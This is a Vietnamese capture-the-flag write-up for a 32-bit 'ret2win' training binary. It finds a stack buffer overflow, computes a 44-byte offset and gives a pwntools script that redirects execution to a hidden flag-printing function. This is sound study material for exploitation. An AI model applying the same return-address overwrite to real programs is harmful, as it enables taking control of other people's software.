**1. Tìm lỗi**

Chạy thử file bằng IDA ta có như sau: 

![main.png](photo/main.png)

Source hàm pwnme:

![pwnme.png](photo/pwnme.png)

Ta thấy chương trình chạy không thể lấy flag được nhưng phát hiện thêm được hàm ret2win có source như sau:

![ret2win.png](photo/ret2win.png)

Ta thấy ở hàm này thì có thể lấy được nội dung của flag

Dùng lệnh 'checksec' để kiểm tra có lỗi bof không.

![checksec.png](photo/checksec.png)

Ta thấy CANARY đang ở trạng thái disabled -> có thể khai thác qua lỗi bof

**2. Ý tưởng**

Biến s cho nhập 0x38 = 56 phần tử nên thử nhập tràn biến s đến ret rồi chèn địa chỉ hàm ret2win vào

**3. Viết script**

![s.png](photo/s.png)

Địa chỉ biến s hiện tại là: rbp - 0x28 -> Khoảng cách từ biến s đến ret là: 0x28 + 0x4 = 44

![add.png](photo/add.png)

Địa chỉ hàm win là: 0x804862c

Ta có script như sau:

```
from pwn import *

r = process("./ret2win32")

ret2win = 0x804862c
payload = b'a'*44 + p32(ret2win)
r.sendline(payload)
r.interactive()
```

**4. Lấy flag**

![add.png](photo/add.png)

Flag: ROPE{a_placeholder_32byte_flag!}